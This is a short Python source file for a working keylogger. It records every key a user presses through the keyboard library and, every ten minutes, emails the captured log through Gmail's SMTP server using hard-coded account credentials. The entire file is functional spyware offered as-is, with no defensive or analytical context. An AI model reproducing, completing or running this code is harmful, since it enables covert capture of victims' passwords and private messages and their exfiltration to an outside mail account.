import keyboard # for keylogs # 
import smtplib # for mail
from threading import Semaphore, Timer #for blocking

SEND_REPORT_EVERY = 600 #time in seconds after which the program send the mail with the data
EMAIL_ADDRESS = "a.random.test.mail@gmail.com" #mail id for sending and receiving the data 
EMAIL_PASSWORD = "test@mail"

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.semaphore = Semaphore(0)

    def callback(self, event):
        
        name = event.name
        if len(name) > 1:
            
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                #name = f"[{name.upper()}]"

        self.log += name
    
    def sendmail(self, email, password, message):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)        # connect to the SMTP server as TLS mode (for security)
        server.starttls()
        
        server.login(email, password)
        
        server.sendmail(email, email, message)  # mail sent to and from the same mail id
        
        server.quit()

    def report(self):
        
        if self.log:
            
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            # print(self.log)  
        self.log = ""
        Timer(interval=self.interval, function=self.report).start() # start timer

    def start(self):
        # start the keylogger
        keyboard.on_release(callback=self.callback)        # start reporting the keylogs
        self.report()        # block the current thread,
        self.semaphore.acquire()

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()
